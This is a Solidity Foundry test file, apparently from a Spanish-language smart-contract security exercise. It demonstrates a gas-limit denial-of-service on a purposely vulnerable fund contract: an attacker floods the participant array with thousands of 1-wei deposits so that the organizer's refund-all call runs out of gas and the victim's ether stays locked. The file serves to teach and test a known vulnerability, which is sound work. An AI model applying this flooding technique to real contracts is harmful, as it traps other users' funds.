// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/FondoVulnerable.sol";

contract FondoVulnerableTest is Test {
    uint256 constant LIMITE_GAS_BLOQUE = 30_000_000;
    uint256 constant CUENTAS_ATACANTE = 4_000;

    FondoVulnerable fondo;
    address organizador = makeAddr("organizador");
    address alice = makeAddr("alice");

    function setUp() public {
        vm.prank(organizador);
        fondo = new FondoVulnerable();
    }

    function test_SiExcedeLimiteGasPorBloque_NoReembolsa() public {
        // Victima deposita 1 ether
        vm.deal(alice, 1 ether);
        vm.prank(alice);
        fondo.participar{value: 1 ether}();

        // Atacante llena el array con miles de direcciones con aportes de 1 wei
        for (uint256 i = 0; i < CUENTAS_ATACANTE; i++) {
            address cuenta = address(uint160(i + 1_000));
            vm.deal(cuenta, 1 ether);
            vm.prank(cuenta);
            fondo.participar{value: 1 wei}();
        }

        assertEq(fondo.cantidadParticipantes(), CUENTAS_ATACANTE + 1); // Atacantes + Alice
        uint256 balanceContratoAntes = address(fondo).balance;

        // El organizador intenta reembolsar respetando el limite de gas del bloque
        vm.prank(organizador);
        vm.expectRevert(bytes("")); // Si tira OutOfGas revierte con mensaje vacio
        fondo.reembolsarTodos{gas: LIMITE_GAS_BLOQUE}();

        assertEq(alice.balance, 0);
        assertEq(address(fondo).balance, balanceContratoAntes);
    }
}
